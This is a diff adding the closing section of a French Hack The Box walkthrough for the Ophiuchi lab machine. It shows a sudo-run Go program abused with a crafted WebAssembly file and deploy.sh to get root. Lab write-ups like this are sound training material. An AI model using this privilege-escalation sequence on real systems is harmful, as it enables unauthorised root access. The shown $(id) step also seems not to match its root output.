@@ -189,3 +189,22 @@ La valeur 0 de cette ligne `(i32.const 0))` doit être changer par `(i32.const 1
     root@kali:~/htb/Ophiuchi# ls
     main.wasm  main.wat
     
+Il ne reste plus que à transporter ce fichier maintenant vers la machine cible dans un dossier dans `/tmp` par exemple.
+
+    admin@ophiuchi:/tmp/.admin_to_root$ ls
+    main.wasm
+    admin@ophiuchi:/tmp/.admin_to_root$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+    Ready to deploy
+    2021/03/24 16:30:32 exit status 127
+    exit status 1
+
+BOUM ! Nous avons réussi à faire modifier la condition du programme `index.go`, maintenant il suffit simplement de créer le fichier `deploy.sh` et de lire le fichier `/root/root.txt`.
+
+    admin@ophiuchi:/tmp/.admin_to_root$ echo "echo $(id)" > deploy.sh
+    admin@ophiuchi:/tmp/.admin_to_root$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+    Ready to deploy
+    uid=0(root) gid=0(root) groups=0(root)
+    
+# Conclusion
+
+Voilà, nous arrivons enfin au bout de cet article qui, je l’espère, vous aura plus. J’ai essayer de vous expliquez le fonctionnement de cette boxe, n’hésitez pas à me contacter sur les réseaux sociaux, je suis toujours disponible pour vous répondre.
